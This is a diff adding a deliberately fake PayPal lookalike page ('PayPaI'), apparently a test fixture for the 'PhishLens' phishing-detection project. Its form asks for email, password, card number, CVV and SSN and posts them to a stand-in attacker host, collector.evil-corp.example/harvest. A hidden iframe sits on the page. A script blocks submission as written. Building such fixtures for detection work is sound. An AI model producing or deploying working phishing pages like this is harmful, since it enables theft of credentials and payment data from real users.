@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>PayPaI — Account Suspended (Verify Now)</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  body{margin:0;font:15px/1.5 Arial,Helvetica,sans-serif;background:#f5f5f5;color:#222}
+  .bar{background:#003087;color:#fff;padding:14px 0;text-align:center;font-size:22px;font-weight:bold}
+  .card{max-width:420px;margin:40px auto;background:#fff;border-radius:8px;
+    box-shadow:0 2px 10px rgba(0,0,0,.15);padding:28px}
+  .alert{background:#fff3cd;border:1px solid #ffc107;color:#856404;border-radius:6px;
+    padding:12px;font-size:14px;margin-bottom:18px}
+  input{width:100%;box-sizing:border-box;padding:11px;margin:7px 0;border:1px solid #ccc;border-radius:5px;font-size:14px}
+  button{width:100%;background:#0070ba;color:#fff;border:0;padding:12px;border-radius:24px;
+    font-size:15px;font-weight:bold;cursor:pointer;margin-top:8px}
+  .fine{font-size:11px;color:#999;text-align:center;margin-top:16px}
+  #reveal{display:none;background:#dcfce7;border:1px solid #16a34a;color:#14532d;
+    border-radius:6px;padding:14px;margin-top:16px;font-size:13px}
+</style>
+</head>
+<body>
+<div class="bar">PayPaI<span style="font-weight:normal;font-size:12px"> (demo phishing page)</span></div>
+<div class="card">
+  <div class="alert">
+    <b>URGENT:</b> Your account has been <b>suspended</b> due to unusual activity.
+    Verify your account <b>within 24 hours</b> or it will be closed permanently.
+  </div>
+  <!-- classic credential harvest: posts cross-site over plaintext HTTP -->
+  <form action="http://collector.evil-corp.example/harvest" method="post" id="f">
+    <input name="email" type="email" placeholder="Email address" required>
+    <input name="password" type="password" placeholder="Password" required>
+    <input name="card_number" placeholder="Card number" inputmode="numeric">
+    <input name="cvv" placeholder="CVV" maxlength="4" inputmode="numeric">
+    <input name="ssn" placeholder="SSN (last 4)" maxlength="4" inputmode="numeric">
+    <button type="submit">Verify My Account</button>
+  </form>
+  <div id="reveal">
+    ✅ <b>Demo intercepted.</b> Nothing was sent. This page is a controlled phishing
+    lookalike from the PhishLens project — with the extension installed, a warning
+    banner fires because of: cross-site HTTP credential form, CVV/SSN fields,
+    urgency language, and a hidden iframe.
+  </div>
+  <div class="fine">This is a deliberately fake page built for phishing-detection demos. Do not enter real data anywhere.</div>
+</div>
+<iframe src="about:blank" width="1" height="1" style="position:absolute;left:-9999px"></iframe>
+<script>
+  document.getElementById("f").addEventListener("submit", function (e) {
+    e.preventDefault();
+    document.getElementById("reveal").style.display = "block";
+  });
+</script>
+</body>
+</html>
